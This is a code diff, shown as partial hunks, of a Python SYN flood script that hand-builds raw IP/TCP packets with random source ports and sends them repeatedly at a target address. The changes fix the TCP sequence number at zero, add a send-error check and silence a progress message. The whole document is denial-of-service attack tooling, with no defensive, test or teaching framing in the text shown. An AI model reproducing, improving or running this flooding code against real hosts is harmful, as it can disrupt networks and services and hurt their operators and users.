@@ -36,10 +36,10 @@ def create_ip_header(src_ip, dst_ip):
     return ip_header
 
 
-def create_tcp_header(src_port, dst_port, seq):
+def create_tcp_header(src_port, dst_port):
     tcp_source = src_port
     tcp_dest = dst_port
-    tcp_seq = seq
+    tcp_seq = 0
     tcp_ack_seq = 0
     tcp_doff = 5
     tcp_fin = 0
@@ -78,12 +78,13 @@ def syn_flood(target_ip, target_port, num_packets, iterations):
                 src_port = random.randint(1024, 65535)
 
                 ip_header = create_ip_header(src_ip, target_ip)
-                tcp_header = create_tcp_header(src_port, target_port, random.randint(0, 4294967295))
+                tcp_header = create_tcp_header(src_port, target_port)
 
                 packet = ip_header + tcp_header
 
                 start_time = time.time()
-                s.sendto(packet, (target_ip, 0))
+                if(s.sendto(packet, (target_ip, 0)) < 0):
+                    print("Error sending packet")
                 end_time = time.time()
 
                 send_time = end_time - start_time
@@ -114,7 +115,7 @@ if __name__ == "__main__":
     start_time = time.time()
 
     for i in range(NUM_ITERATIONS):
-        print(f"Sending SYN num: {iterations}")
+        # print(f"Sending SYN num: {iterations}")
         syn_flood(TARGET_IP, TARGET_PORT, NUM_PACKETS, iterations)
         iterations += NUM_PACKETS
 
